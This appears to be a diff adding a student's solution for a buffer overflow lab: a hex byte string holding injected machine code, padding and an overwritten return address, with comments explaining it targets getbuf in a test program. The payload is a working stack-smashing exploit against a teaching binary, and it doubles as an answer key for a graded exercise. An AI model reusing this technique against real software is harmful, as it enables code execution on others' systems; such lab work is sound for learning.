@@ -1,0 +1,3 @@
+b8 ec 08 c6 58 bd 40 7d ff ff 68 12 8a 04 08 c3 ff ff ff ff ff ff ff ff fc 7c ff ff
+#first 32 are bytes from the exploit code as seen in the level3ass.s file followed by buffering to fill the rest of the 12 byte char array. Then the address of the iunstruction following the getbuf call in the test() function (in little endian).
+#this is passed through the sendstring thing to convert it to the proper ascii code for the porgram to then convert.
